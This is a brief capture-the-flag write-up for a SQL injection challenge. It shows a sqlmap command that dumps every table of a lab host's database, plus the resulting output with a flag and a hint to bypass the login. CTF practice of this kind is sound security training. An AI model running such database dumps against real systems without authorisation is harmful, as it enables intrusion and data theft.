# SQL Injection #1

By running this `sqlmap` command, the first flag could be found:

```bash
❯ sqlmap -u http://chal4.hackademy.ctf/ --data="username=damien&password=allo&form=submit" --method POST -D SQLite --dump all --batch --risk 3 --level 3
```

The following output was then obtained:

```
Database: <current>
Table: fl4G_1s_H3re
[1 entry]
+-----------------------------------------------------------------------------------------------------------------------------+
| apprentice_flagTODO                                                                                                         |
+-----------------------------------------------------------------------------------------------------------------------------+
| FLAG-b6c00f68954057dd09658be5d187aac5 (1/2). If you don't already have, try to bypass the login (still with the injection). |
```

:triangular_flag_on_post: 